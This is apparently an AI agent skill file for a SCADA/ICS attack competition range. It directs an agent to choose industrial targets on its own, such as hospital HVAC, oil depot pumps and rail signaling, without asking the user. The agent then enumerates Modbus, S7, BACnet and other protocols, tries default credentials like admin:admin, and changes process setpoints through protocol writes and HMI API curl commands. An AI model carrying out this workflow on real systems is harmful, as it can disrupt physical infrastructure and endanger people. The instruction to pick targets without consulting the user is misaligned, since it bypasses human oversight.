---
name: solve-scada
description: "SCADA/ICS attack (token-optimized): protocol identification -> per-protocol enumeration/verification -> value manipulation -> evidence capture. If no arguments are given, automatically selects a Hackcity/OT target from MCP."
argument-hint: "[target_ip] [port]"
---

# solve-scada (Token-Optimized)

Target: `$ARGUMENTS` or the SCADA target auto-selected from MCP

Arguments:
- `arg1` = `target_ip` (optional)
- `arg2` = `port` (optional)

## Reference
- `/.idea/local-offline-scada.md`
- `/.idea/tool-list.md`
- `/docs/scada-usage.md`
- `/.claude/skills/risk-autopilot/references/objective-lock.md`
- `/.claude/skills/risk-autopilot/references/risk-priority.md`

## Tool Path Index

```bash
ROOT="."  # repository root
VENV="$ROOT/.venv/bin"
LOOT_BASE="$ROOT/loots"
STATE="$ROOT/scripts/util/objective_state.sh"

# Detect/Template
python3 $ROOT/scripts/templates/protocol_detect.py
python3 $ROOT/scripts/templates/modbus_tcp.py
python3 $ROOT/scripts/templates/opcua_client.py
python3 $ROOT/scripts/templates/s7comm_client.py
python3 $ROOT/scripts/templates/mqtt_client.py
python3 $ROOT/scripts/templates/enip_client.py
python3 $ROOT/scripts/templates/bacnet_scan.py
python3 $ROOT/scripts/templates/dnp3_client.py
python3 $ROOT/scripts/templates/iec104_client.py

# Modbus Deep
python3 $ROOT/scripts/scada/modbus_scanner.py
python3 $ROOT/scripts/scada/modbus_rw.py
```

## Tool Contract (MUST)
- Context: MCP `start_session`, `get_sitrep`, `claim_host`, `update_checklist`, `heartbeat`
- Protocol identification: `protocol_detect.py`
- Per-protocol initial enumeration: `scripts/templates/*`
- Modbus deep scan: `modbus_scanner.py`, `modbus_rw.py`
- Data recording: `add_loot`, `log_event`, `log_session_entry`
- Infrastructure reflection: `add_host`, `update_host`, `import_scan_data` (supported formats)
- Long-running/interactive tasks: `request_task`
- First restore the active objective with `scripts/util/objective_state.sh get`. If the current ICS asset is not directly connected to that objective, record it only as backlog.
- If the user does not specify a facility name or IP, automatically select a Hackcity/OT candidate from MCP.
- Do not perform write operations until `2 oracles` are confirmed.

## Autonomous Target Selection (Default)

If `arg1` is empty, automatically determine using the following order.

1. `scripts/util/objective_state.sh get`
2. If the active objective is empty, do not pick an arbitrary OT asset; return to `risk-autopilot`.
3. `get_sitrep`
4. First build a candidate pool matching the active objective's facility/process/transport.
   - `SPORT STADIUM` -> stadium, arena, lighting, stadium HMI
   - `Government complex` -> gov, admin, complex, power/building control
   - `BUSINESS CENTER` -> elevator, business, tower, BMS
   - `OIL DEPOT` -> oil, pump, tank, depot, process PLC
   - `HOSPITAL` -> hospital, emergency, ward, HVAC/alarm
   - `LRT TRAIN` -> train, lrt, rail, signaling, traction
5. Select only hosts behind Hackcity or the OT bridge that have ICS ports (`102`, `502`, `1883`, `2404`, `4840`, `20000`, `44818`, `47808`) and match the above candidate pool.
6. If there are multiple candidates for the same objective, prioritize:
   - Hosts that already have oracle notes/HMI status
   - Hosts not yet `claim_host`ed
   - Hosts with less loot where new evidence can be generated quickly
7. If Hackcity/OT is not yet reachable, do not ask the user; hand off to `solve-ad` or `pivot` lane.
8. If there are no objective candidates at all, record with `scripts/util/objective_state.sh backlog "<host-or-facility>" "scada candidate exists but not same-chain"` and move to the next lane within the same objective.

## Scenario Bias (AITU Final)
- `Stadium / Government / Business Center`: `BACnet`, `MQTT`, `Modbus`
- `Oil Depot`: `Modbus`, `OPC UA`, `EtherNet/IP`
- `Hospital`: `BACnet`, `Modbus`, `MQTT`
- `LRT`: `S7`, `IEC104`, `Modbus`, `OPC UA`
- The goal is `proving operational impact` rather than `protocol interpretation`.

## Objective Gate
- Proceed only with the same facility/process/transport chain as the active objective.
- Even if easier clues are visible at a different facility, while the current objective is alive, only record `scripts/util/objective_state.sh backlog "<host-or-facility>" "not same-chain"`.
- Lane rotation is allowed, but objective switching is only allowed under the `objective-lock` switch conditions.

## Protocol -> Tool Map
- `502/modbus` -> `modbus_tcp.py` + `modbus_scanner.py/modbus_rw.py`
- `4840/opcua` -> `opcua_client.py`
- `102/s7comm` -> `s7comm_client.py`
- `1883/mqtt` -> `mqtt_client.py`
- `44818/enip` -> `enip_client.py`
- `47808/bacnet` -> `bacnet_scan.py`
- `20000/dnp3` -> `dnp3_client.py`
- `2404/iec104` -> `iec104_client.py`

## Minimal Checklist (content + tools)

- [01 Preflight] Tool: MCP
1. `start_session(title="SCADA: <ip>")` (if none exists)
2. `get_sitrep`
3. `claim_host`
4. `update_checklist(enumStatus="in-progress")`

- [02 Protocol Detect] Tool: `protocol_detect.py`
```bash
python3 scripts/templates/protocol_detect.py -t <ip> --json
```
MCP: `add_loot(filename=protocol_detect.json)`

- [03 Enumerate by Protocol] Tool: templates
```bash
python3 scripts/templates/<proto_client>.py -t <ip> --json
```
MCP: `add_loot(<proto>_enum.json)`, `log_event(scan)`

- [04 Modbus Deep (if 502)] Tool: `modbus_scanner.py`, `modbus_rw.py`
```bash
python3 scripts/scada/modbus_scanner.py -t <ip> -o modbus-scan.json
python3 scripts/scada/modbus_rw.py -t <ip> read holding 0-200 -o modbus-rw.json
```
MCP: `import_scan_data(data=<json>)` or web `POST /api/import` (modbus format)

- [05 Value Manipulation (if needed)] Tool: protocol write
- Save both before/after values and verify once only
MCP: `add_note(before/after)`, `log_event(exploit)`

- [06 Cross-Segment Clue] Tool: enum output
- When internal IP/credentials/hostnames are discovered, reflect immediately
MCP: `add_host`, `update_host`, `add_credential`

- [07 Completion] Tool: MCP
1. `update_checklist(enumStatus="done", exploitStatus="done")`
2. `log_session_entry(type="result", content="SCADA run complete")`
3. `heartbeat`
4. `get_sitrep`

## HMI Web Interface Discovery & API Wrapping

Many SCADA/ICS environments provide an HMI web interface (HTTP/HTTPS).
In parallel with protocol enumeration, follow the flow of HMI web discovery -> API wrapping -> operational impact proof.

### Step 1: HMI Web Discovery
```bash
# Search for HMI interfaces on web ports 80, 443, 8080, 8443, etc.
curl -sk http://<ip>/ | head -50
curl -sk https://<ip>/ | head -50
curl -sk http://<ip>:8080/ | head -50

# Check title/tech stack
curl -sI http://<ip>/
```
- Check for login pages, dashboards, API documentation
- MCP: `add_note(tags=scada,hmi,web)`

### Step 2: API Endpoint Enumeration
```bash
# Search common HMI API paths
for p in /api /api/v1 /rest /graphql /swagger.json /openapi.json /docs; do
  curl -sk -o /dev/null -w "%{http_code} $p\n" "http://<ip>$p"
done

# Obtain auth token after login (common pattern)
curl -sk -X POST http://<ip>/api/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"admin"}'

# Explore endpoints after authentication
curl -sk -H "Authorization: Bearer <token>" http://<ip>/api/v1/status
curl -sk -H "Authorization: Bearer <token>" http://<ip>/api/v1/devices
curl -sk -H "Authorization: Bearer <token>" http://<ip>/api/v1/alarms
```
MCP: `add_loot(filename=hmi_api_map.md, lootType=config)`

### Step 3: Read/Write Verification (before/after)
```bash
# Read current state (before)
curl -sk -H "Auth..." http://<ip>/api/v1/devices/<id>/status > /tmp/hmi_before.json

# Change value (write)
curl -sk -X PUT -H "Auth..." -H "Content-Type: application/json" \
  http://<ip>/api/v1/devices/<id>/control \
  -d '{"setpoint": <new_value>}'

# Read state after change (after)
curl -sk -H "Auth..." http://<ip>/api/v1/devices/<id>/status > /tmp/hmi_after.json

# diff
diff /tmp/hmi_before.json /tmp/hmi_after.json
```
MCP: `add_note(before/after)`, `log_event(exploit)`

### Step 4: Default/Weak Credential Attempts
Try the following defaults on the HMI web login:
- `admin:admin`, `admin:password`, `admin:1234`
- `operator:operator`, `engineer:engineer`
- `guest:guest`, `user:user`
MCP: `add_credential(credType=service, linkedService=hmi-web)`

## Note (Import Support)
Currently `web-app /api/import` is centered on SCADA `modbus-scanner` and `modbus-rw` formats.
Other protocol results should first be stored as evidence with `add_loot`, with subsequent importer expansion to follow.

## Human Delegation Rule
Immediately use `request_task` for:
- Full port scan (`nmap -p-`)
- Long-running fuzzing/capture
- Interactive PTY steps

## Stop / Handoff Rule
- If a protocol is visible but there is no oracle, put it on hold and move to the next asset/next lane `within the same objective`.
- If a before/after decision boundary cannot be established within 15 minutes, record the reason for being stuck with `add_note` and move to the next candidate while maintaining the objective.
- Do not ask the user "Which facility should we start with?"
